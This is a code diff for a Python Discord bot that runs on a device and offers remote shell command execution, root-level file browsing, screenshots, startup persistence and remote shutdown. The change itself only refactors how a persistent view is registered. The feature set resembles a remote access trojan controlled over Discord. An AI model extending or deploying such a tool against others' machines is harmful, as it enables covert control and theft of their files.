@@ -11,7 +11,7 @@ import screenshot_taker as ss
 import system_info as sysinfo
 import web_opener
 import startup_manager
-import file_explorer as fe # <-- NEW: Import the file explorer module
+import file_explorer as fe
 
 # --- Configuration ---
 TOKEN_PATH = 'token.txt'
@@ -21,13 +21,21 @@ SERVER_CATEGORY_NAME = "🔴 Live Sessions"
 # --- Global State ---
 session_channel = None
 
-# --- Bot Setup ---
+# --- Bot Setup with setup_hook ---
+# THIS IS THE RECOMMENDED WAY TO REGISTER PERSISTENT VIEWS
+class PersistentBot(commands.Bot):
+    async def setup_hook(self):
+        # This hook is called after the bot logs in but before it is ready.
+        # The event loop is running at this point.
+        self.add_view(fe.FileExplorerView())
+        print("Persistent File Explorer view has been registered.")
+
 intents = discord.Intents.default()
 intents.message_content = True
-# Register the persistent view before the bot runs
-bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)
-bot.add_view(fe.FileExplorerView())
+bot = PersistentBot(command_prefix='!', intents=intents, help_command=None)
 
+# REMOVED: The problematic line is no longer here.
+# bot.add_view(fe.FileExplorerView()) 
 
 def load_token() -> str:
     if not os.path.exists(TOKEN_PATH):
@@ -47,7 +55,7 @@ def is_authorized(interaction: discord.Interaction) -> bool:
         return True
     return False
 
-# ... (all previous commands like runcmd, shownotification, etc. remain unchanged) ...
+# ... (all your commands like runcmd, shownotification, etc. remain exactly the same) ...
 @bot.tree.command(name="runcmd", description="Execute a system command on this device.")
 async def runcmd(interaction: discord.Interaction, command: str):
     if not is_authorized(interaction):
@@ -133,7 +141,6 @@ async def remotekill(interaction: discord.Interaction):
     if session_channel:
         await session_channel.send(embed=offline_embed)
     await bot.close()
-# --- NEW FILE EXPLORER COMMAND ---
 
 @bot.tree.command(name="explorer", description="Launch an interactive file explorer for this device.")
 async def explorer(interaction: discord.Interaction):
@@ -143,21 +150,17 @@ async def explorer(interaction: discord.Interaction):
     await interaction.response.defer()
     
     channel_id = interaction.channel.id
-    # Set the initial path to the system root
     initial_path = os.path.abspath(os.sep)
     fe.explorer_sessions[channel_id] = initial_path
     
     embed, dirs = fe.create_explorer_embed(initial_path)
     view = fe.FileExplorerView()
     
-    # Create the dynamic callback for the "Change Directory" button
     view.children[3].callback = view.create_modal_callback(dirs)
     
     await interaction.followup.send(embed=embed, view=view)
 
-
-# --- Connection and Session Handling ---
-
+# --- Connection and Session Handling (No changes) ---
 @bot.event
 async def on_ready():
     global session_channel
